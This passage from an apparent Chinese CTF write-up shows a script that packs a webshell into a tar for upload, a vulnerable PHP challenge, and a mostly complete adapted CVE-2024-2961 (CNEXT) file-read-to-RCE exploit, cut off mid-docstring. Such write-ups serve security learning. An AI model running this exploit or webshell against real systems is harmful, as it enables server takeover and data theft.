punctuation">.</span>addfile<span class="token punctuation">(</span>file_info<span class="token punctuation">,</span> BytesIO<span class="token punctuation">(</span>webshell_content<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"webshell.tar 创建成功！"</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"-"</span> <span class="token operator">*</span> <span class="token number">30</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"请按顺序上传这两个文件。"</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://cdn.jsdelivr.net/gh/lingqing777/Cloud-Image-Hosting/753f5dc5fd6104c78c5e281ed1df76ba.png"></p><hr><h3 id="SeRce"><a href="#SeRce" class="headerlink" title="SeRce"></a>SeRce</h3><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$exp</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"exp"</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$exp</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">serialize</span><span class="token punctuation">(</span><span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token variable">$exp</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token variable">$exp</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token variable">$data</span> <span class="token operator">=</span> <span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'filetoread'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">echo</span> <span class="token string double-quoted-string">"File Contents: <span class="token interpolation"><span class="token variable">$data</span></span>"</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token comment">#?exp=s:4:"te";即可</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>or CVE-2024-2961漏洞原：<a href="https://github.com/ambionics/cnext-exploits/blob/main/cnext-exploit.py">cnext-exploits/cnext-exploit.py at main · ambionics/cnext-exploits</a></p><p>改一下poc的细节就能发</p><p>(win)</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment">#!/usr/bin/env python5</span><span class="token comment">#</span><span class="token comment"># CNEXT: PHP file-read to RCE (CVE-2024-2961)</span><span class="token comment"># Date: 2024-05-27</span><span class="token comment"># Author: Charles FOL @cfreal_ (LEXFO/AMBIONICS)</span><span class="token comment">#</span><span class="token comment"># TODO Parse LIBC to know if patched</span><span class="token comment">#</span><span class="token comment"># INFORMATIONS</span><span class="token comment">#</span><span class="token comment"># To use, implement the Remote class, which tells the exploit how to send the payload.</span><span class="token comment">#</span><span class="token keyword">from</span> __future__ <span class="token keyword">import</span> annotations<span class="token keyword">import</span> base64<span class="token keyword">import</span> zlib<span class="token keyword">from</span> dataclasses <span class="token keyword">import</span> dataclass<span class="token keyword">from</span> requests<span class="token punctuation">.</span>exceptions <span class="token keyword">import</span> ConnectionError<span class="token punctuation">,</span> ChunkedEncodingError<span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span><span class="token keyword">from</span> ten <span class="token keyword">import</span> <span class="token operator">*</span>HEAP_SIZE <span class="token operator">=</span> <span class="token number">2</span> <span class="token operator">*</span> <span class="token number">1024</span> <span class="token operator">*</span> <span class="token number">1024</span>BUG <span class="token operator">=</span> <span class="token string">"劄"</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token string">"utf-8"</span><span class="token punctuation">)</span><span class="token keyword">class</span> <span class="token class-name">Remote</span><span class="token punctuation">:</span>    <span class="token triple-quoted-string string">"""A helper class to send the payload and download files.    The logic of the exploit is always the same, but the exploit needs to know how to    download files (/proc/self/maps and libc) and how to send the payload.    The code here serves as an example that attacks a page that looks like:    ```php    &lt;?php    $data = file_get_contents($_POST['file']);    echo "File contents: $data";    ```    Tweak it to fit your target, and start the exploit.    """</span>    <span class="token keyword">def</span> <span class="token function">__init__</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> url<span class="token punctuation">:</span> <span class="token builtin">str</span><span class="token punctuation">)</span> <span class="token operator">-</span><span class="token operator">&gt;</span> <span class="token boolean">None</span><span class="token punctuation">:</span>        self<span class="token punctuation">.</span>url <span class="token operator">=</span> url        self<span class="token punctuation">.</span>session <span class="token operator">=</span> Session<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">def</span> <span class="token function">send</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> path<span class="token punctuation">:</span> <span class="token builtin">str</span><span class="token punctuation">)</span> <span class="token operator">-</span><span class="token operator">&gt;</span> Response<span class="token punctuation">:</span>        <span class="token triple-quoted-string string">"""Sends given `path` to the HTTP server. Returns the response.        """</span>        a <span class="token operator">=</span> <span class="token string">"a:2:{i:0;S:1:\"/10\";i:1;i:1;}"</span>        get_params <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token string">"exp"</span><span class="token punctuation">:</span> a<span class="token punctuation">}</span>        <span class="token keyword">print</span><span class="token punctuation">(</span>self<span class="token punctuation">.</span>session<span class="token punctuation">.</span>post<span class="token punctuation">(</span>self<span class="token punctuation">.</span>url<span class="token punctuation">,</span> params<span class="token operator">=</span>get_params<span class="token punctuation">)</span><span class="token punctuation">.</span>text<span class="token punctuation">)</span>        <span class="token keyword">return</span> self<span class="token punctuation">.</span>session<span class="token punctuation">.</span>post<span class="token punctuation">(</span>self<span class="token punctuation">.</span>url<span class="token punctuation">,</span> data<span class="token operator">=</span><span class="token punctuation">{</span><span class="token string">"filetoread"</span><span class="token punctuation">:</span> path<span class="token punctuation">}</span><span class="token punctuation">,</span> params<span class="token operator">=</span>get_params<span class="token punctuation">)</span>    <span class="token keyword">def</span> <span class="token function">download</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> path<span class="token punctuation">:</span> <span class="token builtin">str</span><span class="token punctuation">)</span> <span class="token operator">-</span><span class="token operator">&gt;</span> <span class="token builtin">bytes</span><span class="token punctuation">:</span>        <span class="token triple-quoted-string string">"""Returns the contents of a remote file.        """</span>        path <span class="token operator">=</span> <span class="token string-interpolation"><span class="token string">f"php://filter/convert.base64-encode/resource=</span><span class="token interpolation"><span class="token punctuation">{</span>path<span class="token punctuation">}</span></span><span class="token string">"</span></span>        response <span class="token operator">=</span> self<span class="token punctuation">.</span>send<span class="token punctuation">(</span>path<span class="token punctuation">)</span>        <span class="token keyword">match</span> <span class="token operator">=</span> re<span class="token punctuation">.</span>search<span class="token punctuation">(</span><span class="token string">b"File Contents: (.*)"</span><span class="token punctuation">,</span> response<span class="token punctuation">.</span>content<span class="token punctuation">,</span> flags<span class="token operator">=</span>re<span class="token punctuation">.</span>S<span class="token punctuation">)</span>        data <span class="token operator">=</span> <span class="token keyword">match</span><span class="token punctuation">.</span>group<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>        <span class="token keyword">return</span> base64<span class="token punctuation">.</span>decode<span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token decorator annotation punctuation">@entry</span><span class="token decorator annotation punctuation">@arg</span><span class="token punctuation">(</span><span class="token string">"url"</span><span class="token punctuation">,</span> <span class="token string">"Target URL"</span><span class="token punctuation">)</span><span class="token decorator annotation punctuation">@arg</span><span class="token punctuation">(</span><span class="token string">"command"</span><span class="token punctuation">,</span> <span class="token string">"Command to run on the system; limited to 0x140 bytes"</span><span class="token punctuation">)</span><span class="token decorator annotation punctuation">@arg</span><span class="token punctuation">(</span><span class="token string">"sleep"</span><span class="token punctuation">,</span> <span class="token string">"Time to sleep to assert that the exploit worked. By default, 1."</span><span class="token punctuation">)</span><span class="token decorator annotation punctuation">@arg</span><span class="token punctuation">(</span><span class="token string">"heap"</span><span class="token punctuation">,</span> <span class="token string">"Address of the main zend_mm_heap structure."</span><span class="token punctuation">)</span><span class="token decorator annotation punctuation">@arg</span><span class="token punctuation">(</span>    <span class="token string">"pad"</span><span class="token punctuation">,</span>    <span class="token string">"Number of 0x100 chunks to pad with. If the website makes a lot of heap "</span>    <span class="token string">"operations with this size, increase this. Defaults to 20."</span><span class="token punctuation">,</span><span class="token punctuation">)</span><span class="token decorator annotation punctuation">@dataclass</span><span class="token keyword">class</span> <span class="token class-name">Exploit</span><span class="token punctuation">:</span>    <span class="token triple-quoted-string string">"""CNEXT exploit: RCE using a file read primitive in PHP."""</span>    url<span class="token punctuation">:</span> <span class="token builtin">str</span>    command<span class="token punctuation">:</span> <span class="token builtin">str</span>    sleep<span class="token punctuation">:</span> <span class="token builtin">int</span> <span class="token operator">=</span> <span class="token number">1</span>    heap<span class="token punctuation">:</span> <span class="token builtin">str</span> <span class="token operator">=</span> <span class="token boolean">None</span>    pad<span class="token punctuation">:</span> <span class="token builtin">int</span> <span class="token operator">=</span> <span class="token number">20</span>    <span class="token keyword">def</span> <span class="token function">__post_init__</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>        self<span class="token punctuation">.</span>remote <span class="token operator">=</span> Remote<span class="token punctuation">(</span>self<span class="token punctuation">.</span>url<span class="token punctuation">)</span>        self<span class="token punctuation">.</span>log <span class="token operator">=</span> logger<span class="token punctuation">(</span><span class="token string">"EXPLOIT"</span><span class="token punctuation">)</span>        self<span class="token punctuation">.</span>info <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token punctuation">}</span>        self<span class="token punctuation">.</span>heap <span class="token operator">=</span> self<span class="token punctuation">.</span>heap <span class="token keyword">and</span> <span class="token builtin">int</span><span class="token punctuation">(</span>self<span class="token punctuation">.</span>heap<span class="token punctuation">,</span> <span class="token number">16</span><span class="token punctuation">)</span>    <span class="token keyword">def</span> <span class="token function">check_vulnerable</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span> <span class="token operator">-</span><span class="token operator">&gt;</span> <span class="token boolean">None</span><span class="token punctuation">:</span>        <span class="token triple-quoted-string string">"""Checks whether the target is reachable and properly allows for the various        wrappers and filters that the exploit needs.        """</span>        <span class="token keyword">def</span> <span class="token function">safe_download</span><span class="token punctuation">(</span>path<span class="token punctuation">:</span> <span class="token builtin">str</span><span class="token punctuation">)</span> <span class="token operator">-</span><span class="token operator">&gt;</span> <span class="token builtin">bytes</span><span class="token punctuation">:</span>            <span class="token keyword">try</span><span class="token punctuation">:</span>                <span class="token keyword">return</span> self<span class="token punctuation">.</span>remote<span class="token punctuation">.</span>download<span class="token punctuation">(</span>path<span class="token punctuation">)</span>            <span class="token keyword">except</span> ConnectionError<span class="token punctuation">:</span>                failure<span class="token punctuation">(</span><span class="token string">"Target not [b]reachable[/] ?"</span><span class="token punctuation">)</span>        <span class="token keyword">def</span> <span class="token function">check_token</span><span class="token punctuation">(</span>text<span class="token punctuation">:</span> <span class="token builtin">str</span><span class="token punctuation">,</span> path<span class="token punctuation">:</span> <span class="token builtin">str</span><span class="token punctuation">)</span> <span class="token operator">-</span><span class="token operator">&gt;</span> <span class="token builtin">bool</span><span class="token punctuation">:</span>            result <span class="token operator">=</span> safe_download<span class="token punctuation">(</span>path<span class="token punctuation">)</span>            <span class="token keyword">return</span> text<span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">==</span> result        text <span class="token operator">=</span> tf<span class="token punctuation">.</span>random<span class="token punctuation">.</span>string<span class="token punctuation">(</span><span class="token number">50</span><span class="token punctuation">)</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span>        base64 <span class="token operator">=</span> b64<span class="token punctuation">(</span>text<span class="token punctuation">,</span> misalign<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">)</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token punctuation">)</span>        path <span class="token operator">=</span> <span class="token string-interpolation"><span class="token string">f"data:text/plain;base64,</span><span class="token interpolation"><span class="token punctuation">{</span>base64<span class="token punctuation">}</span></span><span class="token string">"</span></span>        result <span class="token operator">=</span> safe_download<span class="token punctuation">(</span>path<span class="token punctuation">)</span>        <span class="token keyword">if</span> text <span class="token keyword">not</span> <span class="token keyword">in</span> result<span class="token punctuation">:</span>            msg_failure<span class="token punctuation">(</span><span class="token string">"Remote.download did not return the test string"</span><span class="token punctuation">)</span>            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"--------------------"</span><span class="token punctuation">)</span>            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"Expected test string: </span><span class="token interpolation"><span class="token punctuation">{</span>text<span class="token punctuation">}</span></span><span class="token string">"</span></span><span class="token punctuation">)</span>            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"Got: </span><span class="token interpolation"><span class="token punctuation">{</span>result<span class="token punctuation">}</span></span><span class="token string">"</span></span><span class="token punctuation">)</span>            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"--------------------"</span><span class="token punctuation">)</span>            failure<span class="token punctuation">(</span><span class="token string">"If your code works fine, it means that the [i]data://[/] wrapper does not work"</span><span class="token punctuation">)</span>        msg_info<span class="token punctuation">(</span><span class="token string">"The [i]data://[/] wrapper works"</span><span class="token punctuation">)</span>        text <span class="token operator">=</span> tf<span class="token punctuation">.</span>random<span class="token punctuation">.</span>string<span class="token punctuation">(</span><span class="token number">50</span><span class="token punctuation">)</span>        base64 <span class="token operator">=</span> b64<span class="token punctuation">(</span>text<span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> misalign<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">)</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token punctuation">)</span>        path <span class="token operator">=</span> <span class="token string-interpolation"><span class="token string">f"php://filter//resource=data:text/plain;base64,</span><span class="token interpolation"><span class="token punctuation">{</span>base64<span class="token punctuation">}</span></span><span class="token string">"</span></span>        <span class="token keyword">if</span> <span class="token keyword">not</span> check_token<span class="token punctuation">(</span>text<span class="token punctuation">,</span> path<span class="token punctuation">)</span><span class="token punctuation">:</span>            failure<span class="token punctuation">(</span><span class="token string">"The [i]php://filter/[/] wrapper does not work"</span><span class="token punctuation">)</span>        msg_info<span class="token punctuation">(</span><span class="token string">"The [i]php://filter/[/] wrapper works"</span><span class="token punctuation">)</span>        text <span class="token operator">=</span> tf<span class="token punctuation">.</span>random<span class="token punctuation">.</span>string<span class="token punctuation">(</span><span class="token number">50</span><span class="token punctuation">)</span>        base64 <span class="token operator">=</span> b64<span class="token punctuation">(</span>compress<span class="token punctuation">(</span>text<span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span> misalign<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">)</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token punctuation">)</span>        path <span class="token operator">=</span> <span class="token string-interpolation"><span class="token string">f"php://filter/zlib.inflate/resource=data:text/plain;base64,</span><span class="token interpolation"><span class="token punctuation">{</span>base64<span class="token punctuation">}</span></span><span class="token string">"</span></span>        <span class="token keyword">if</span> <span class="token keyword">not</span> check_token<span class="token punctuation">(</span>text<span class="token punctuation">,</span> path<span class="token punctuation">)</span><span class="token punctuation">:</span>            failure<span class="token punctuation">(</span><span class="token string">"The [i]zlib[/] extension is not enabled"</span><span class="token punctuation">)</span>        msg_info<span class="token punctuation">(</span><span class="token string">"The [i]zlib[/] extension is enabled"</span><span class="token punctuation">)</span>        msg_success<span class="token punctuation">(</span><span class="token string">"Exploit preconditions are satisfied"</span><span class="token punctuation">)</span>    <span class="token keyword">def</span> <span class="token function">get_file</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> path<span class="token punctuation">:</span> <span class="token builtin">str</span><span class="token punctuation">)</span> <span class="token operator">-</span><span class="token operator">&gt;</span> <span class="token builtin">bytes</span><span class="token punctuation">:</span>        <span class="token keyword">with</span> msg_status<span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"Downloading [i]</span><span class="token interpolation"><span class="token punctuation">{</span>path<span class="token punctuation">}</span></span><span class="token string">[/]..."</span></span><span class="token punctuation">)</span><span class="token punctuation">:</span>            <span class="token keyword">return</span> self<span class="token punctuation">.</span>remote<span class="token punctuation">.</span>download<span class="token punctuation">(</span>path<span class="token punctuation">)</span>    <span class="token keyword">def</span> <span class="token function">get_regions</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span> <span class="token operator">-</span><span class="token operator">&gt;</span> <span class="token builtin">list</span><span class="token punctuation">[</span>Region<span class="token punctuation">]</span><span class="token punctuation">:</span>        <span class="token triple-quoted-string string">"""Obtains the memory regions of the PHP process by querying /proc/self/maps."""</span>        maps <span class="token operator">=</span> self<span class="token punctuation">.</span>get_file<span class="token punctuation">(</span><span class="token string">"/proc/self/maps"</span><span class="token punctuation">)</span>        maps <span class="token operator">=</span> maps<span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token punctuation">)</span>        PATTERN <span class="token operator">=</span> re<span class="token punctuation">.</span><span class="token builtin">compile</span><span class="token punctuation">(</span>            <span class="token string">r"^([a-f0-9]+)-([a-f0-9]+)\b"</span> <span class="token string">r".*"</span> <span class="token string">r"\s([-rwx]{3}[ps])\s"</span> <span class="token string">r"(.*)"</span>        <span class="token punctuation">)</span>        regions <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>        <span class="token keyword">for</span> region <span class="token keyword">in</span> table<span class="token punctuation">.</span>split<span class="token punctuation">(</span>maps<span class="token punctuation">,</span> strip<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">)</span><span class="token punctuation">:</span>            <span class="token keyword">if</span> <span class="token keyword">match</span> <span class="token operator">:=</span> PATTERN<span class="token punctuation">.</span><span class="token keyword">match</span><span class="token punctuation">(</span>region<span class="token punctuation">)</span><span class="token punctuation">:</span>                start <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span><span class="token keyword">match</span><span class="token punctuation">.</span>group<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">16</span><span class="token punctuation">)</span>                stop <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span><span class="token keyword">match</span><span class="token punctuation">.</span>group<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">16</span><span class="token punctuation">)</span>                permissions <span class="token operator">=</span> <span class="token keyword">match</span><span class="token punctuation">.</span>group<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span>                path <span class="token operator">=</span> <span class="token keyword">match</span><span class="token punctuation">.</span>group<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">)</span>                <span class="token keyword">if</span> <span class="token string">"/"</span> <span class="token keyword">in</span> path <span class="token keyword">or</span> <span class="token string">"["</span> <span class="token keyword">in</span> path<span class="token punctuation">:</span>                    path <span class="token operator">=</span> path<span class="token punctuation">.</span>rsplit<span class="token punctuation">(</span><span class="token string">" "</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span>                <span class="token keyword">else</span><span class="token punctuation">:</span>                    path <span class="token operator">=</span> <span class="token string">""</span>                current <span class="token operator">=</span> Region<span class="token punctuation">(</span>start<span class="token punctuation">,</span> stop<span class="token punctuation">,</span> permissions<span class="token punctuation">,</span> path<span class="token punctuation">)</span>                regions<span class="token punctuation">.</span>append<span class="token punctuation">(</span>current<span class="token punctuation">)</span>            <span class="token keyword">else</span><span class="token punctuation">:</span>                <span class="token keyword">print</span><span class="token punctuation">(</span>maps<span class="token punctuation">)</span>                failure<span class="token punctuation">(</span><span class="token string">"Unable to parse memory mappings"</span><span class="token punctuation">)</span>        self<span class="token punctuation">.</span>log<span class="token punctuation">.</span>info<span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"Got </span><span class="token interpolation"><span class="token punctuation">{</span><span class="token builtin">len</span><span class="token punctuation">(</span>regions<span class="token punctuation">)</span><span class="token punctuation">}</span></span><span class="token string"> memory regions"</span></span><span class="token punctuation">)</span>        <span class="token keyword">return</span> regions    <span class="token keyword">def</span> <span class="token function">get_symbols_and_addresses</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span> <span class="token operator">-</span><span class="token operator">&gt;</span> <span class="token boolean">None</span><span class="token punctuation">:</span>        <span class="token triple-quoted-string string">"""Obtains useful symbols and addresses from the file read primitive."""</span>        regions <span class="token operator">=</span> self<span class="token punctuation">.</span>get_regions<span class="token punctuation">(</span><span class="token punctuation">)</span>        LIBC_FILE <span class="token operator">=</span> <span class="token string">r"D:\Pictures\pythonProject5\cnext-libc"</span>        <span class="token comment"># PHP's heap</span>        self<span class="token punctuation">.</span>info<span class="token punctuation">[</span><span class="token string">"heap"</span><span class="token punctuation">]</span> <span class="token operator">=</span> self<span class="token punctuation">.</span>heap <span class="token keyword">or</span> self<span class="token punctuation">.</span>find_main_heap<span class="token punctuation">(</span>regions<span class="token punctuation">)</span>        <span class="token comment"># Libc</span>        libc <span class="token operator">=</span> self<span class="token punctuation">.</span>_get_region<span class="token punctuation">(</span>regions<span class="token punctuation">,</span> <span class="token string">"libc-"</span><span class="token punctuation">,</span> <span class="token string">"libc.so"</span><span class="token punctuation">)</span>        self<span class="token punctuation">.</span>download_file<span class="token punctuation">(</span>libc<span class="token punctuation">.</span>path<span class="token punctuation">,</span> LIBC_FILE<span class="token punctuation">)</span>        self<span class="token punctuation">.</span>info<span class="token punctuation">[</span><span class="token string">"libc"</span><span class="token punctuation">]</span> <span class="token operator">=</span> ELF<span class="token punctuation">(</span>LIBC_FILE<span class="token punctuation">,</span> checksec<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">)</span>        self<span class="token punctuation">.</span>info<span class="token punctuation">[</span><span class="token string">"libc"</span><span class="token punctuation">]</span><span class="token punctuation">.</span>address <span class="token operator">=</span> libc<span class="token punctuation">.</span>start    <span class="token keyword">def</span> <span class="token function">_get_region</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> regions<span class="token punctuation">:</span> <span class="token builtin">list</span><span class="token punctuation">[</span>Region<span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token operator">*</span>names<span class="token punctuation">:</span> <span class="token builtin">str</span><span class="token punctuation">)</span> <span class="token operator">-</span><span class="token operator">&gt;</span> Region<span class="token punctuation">:</span>        <span class="token triple-quoted-string string">"""Returns the first region whose name matches one of the given names."""</span>        <span class="token keyword">for</span> region <span class="token keyword">in</span> regions<span class="token punctuation">:</span>            <span class="token keyword">if</span> <span class="token builtin">any</span><span class="token punctuation">(</span>name <span class="token keyword">in</span> region<span class="token punctuation">.</span>path <span class="token keyword">for</span> name <span class="token keyword">in</span> names<span class="token punctuation">)</span><span class="token punctuation">:</span>                <span class="token keyword">break</span>        <span class="token keyword">else</span><span class="token punctuation">:</span>            failure<span class="token punctuation">(</span><span class="token string">"Unable to locate region"</span><span class="token punctuation">)</span>        <span class="token keyword">return</span> region    <span class="token keyword">def</span> <span class="token function">download_file</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> remote_path<span class="token punctuation">:</span> <span class="token builtin">str</span><span class="token punctuation">,</span> local_path<span class="token punctuation">:</span> <span class="token builtin">str</span><span class="token punctuation">)</span> <span class="token operator">-</span><span class="token operator">&gt;</span> <span class="token boolean">None</span><span class="token punctuation">:</span>        <span class="token triple-quoted-string string">"""Downloads `remote_path` to `local_path`"""</span>        data <span class="token operator">=</span> self<span class="token punctuation">.</span>get_file<span class="token punctuation">(</span>remote_path<span class="token punctuation">)</span>        <span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span>local_path<span class="token punctuation">,</span> <span class="token string">"wb"</span><span class="token punctuation">)</span> <span class="token keyword">as</span> f<span class="token punctuation">:</span>            f<span class="token punctuation">.</span>write<span class="token punctuation">(</span>data<span class="token punctuation">)</span>    <span class="token keyword">def</span> <span class="token function">find_main_heap</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> regions<span class="token punctuation">:</span> <span class="token builtin">list</span><span class="token punctuation">[</span>Region<span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">-</span><span class="token operator">&gt;</span> Region<span class="token punctuation">:</span>        <span class="token comment"># Any anonymous RW region with a size superior to the base heap size is a</span>        <span class="token comment"># candidate. The heap is at the bottom of the region.</span>        heaps <span class="token operator">=</span> <span class="token punctuation">[</span>            region<span class="token punctuation">.</span>stop <span class="token operator">-</span> HEAP_SIZE <span class="token operator">+</span> <span class="token number">0x40</span>            <span class="token keyword">for</span> region <span class="token keyword">in</span> <span class="token builtin">reversed</span><span class="token punctuation">(</span>regions<span class="token punctuation">)</span>            <span class="token keyword">if</span> region<span class="token punctuation">.</span>permissions <span class="token operator">==</span> <span class="token string">"rw-p"</span>            <span class="token keyword">and</span> region<span class="token punctuation">.</span>size <span class="token operator">&gt;=</span> HEAP_SIZE            <span class="token keyword">and</span> region<span class="token punctuation">.</span>stop <span class="token operator">&amp;</span> <span class="token punctuation">(</span>HEAP_SIZE <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">0</span>            <span class="token keyword">and</span> region<span class="token punctuation">.</span>path <span class="token keyword">in</span> <span class="token punctuation">(</span><span class="token string">""</span><span class="token punctuation">,</span> <span class="token string">"[anon:zend_alloc]"</span><span class="token punctuation">)</span>        <span class="token punctuation">]</span>        <span class="token keyword">if</span> <span class="token keyword">not</span> heaps<span class="token punctuation">:</span>            failure<span class="token punctuation">(</span><span class="token string">"Unable to find PHP's main heap in memory"</span><span class="token punctuation">)</span>        first <span class="token operator">=</span> heaps<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>        <span class="token keyword">if</span> <span class="token builtin">len</span><span class="token punctuation">(</span>heaps<span class="token punctuation">)</span> <span class="token operator">&gt;</span> <span class="token number">1</span><span class="token punctuation">:</span>            heaps <span class="token operator">=</span> <span class="token string">", "</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span><span class="token builtin">map</span><span class="token punctuation">(</span><span class="token builtin">hex</span><span class="token punctuation">,</span> heaps<span class="token punctuation">)</span><span class="token punctuation">)</span>            msg_info<span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"Potential heaps: [i]</span><span class="token interpolation"><span class="token punctuation">{</span>heaps<span class="token punctuation">}</span></span><span class="token string">[/] (using first)"</span></span><span class="token punctuation">)</span>        <span class="token keyword">else</span><span class="token punctuation">:</span>            msg_info<span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"Using [i]</span><span class="token interpolation"><span class="token punctuation">{</span><span class="token builtin">hex</span><span class="token punctuation">(</span>first<span class="token punctuation">)</span><span class="token punctuation">}</span></span><span class="token string">[/] as heap"</span></span><span class="token punctuation">)</span>        <span class="token keyword">return</span> first    <span class="token keyword">def</span> <span class="token function">run</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span> <span class="token operator">-</span><span class="token operator">&gt;</span> <span class="token boolean">None</span><span class="token punctuation">:</span>        self<span class="token punctuation">.</span>check_vulnerable<span class="token punctuation">(</span><span class="token punctuation">)</span>        self<span class="token punctuation">.</span>get_symbols_and_addresses<span class="token punctuation">(</span><span class="token punctuation">)</span>        self<span class="token punctuation">.</span>exploit<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">def</span> <span class="token function">build_exploit_path</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span> <span class="token operator">-</span><span class="token operator">&gt;</span> <span class="token builtin">str</span><span class="token punctuation">:</span>        <span class="token triple-quoted-string string">"""On each step of the exploit, a filter will process each chunk one after the        other. Processing generally involves making some kind of operation either        on the chunk or in a destination chunk of the same size. Each operation is        applied on every single chunk; you cannot make PHP apply iconv on the first 10        chunks and leave the rest in place. That's where the difficulties come from.        Keep in mind that we know the address of the main heap, and the libraries.        ASLR/PIE do not matter here.        The idea is to use the bug to make the freelist for chunks of size 0x100 point        lower. For instance, we have the following free list:        ... -&gt; 0x7fffAABBCC900 -&gt; 0x7fffAABBCCA00 -&gt; 0x7fffAABBCCB00        By triggering the bug from chunk ..900, we get:        ... -&gt; 0x7fffAABBCCA00 -&gt; 0x7fffAABBCCB48 -&gt; ???        That's step 3.        Now, in order to control the free list, and make it point whereever we want,        we need to have previously put a pointer at address 0x7fffAABBCCB48. To do so,        we'd have to have allocated 0x7fffAABBCCB00 and set our pointer at offset 0x48.        That's step 2.        Now, if we were to perform step2 an then step3 without anything else, we'd have        a problem: after step2 has been processed, the free list goes bottom-up, like:        